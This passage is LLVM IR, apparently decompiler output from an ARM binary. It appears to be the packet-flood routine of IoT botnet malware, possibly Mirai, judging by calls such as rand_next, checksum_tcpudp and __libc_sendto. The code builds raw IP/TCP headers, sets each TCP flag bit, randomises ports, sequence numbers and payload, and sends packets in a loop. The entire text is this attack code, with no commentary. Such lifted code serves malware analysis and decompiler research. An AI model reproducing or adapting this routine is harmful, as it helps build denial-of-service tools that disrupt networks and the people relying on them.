  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v3_b7a8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_b77c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
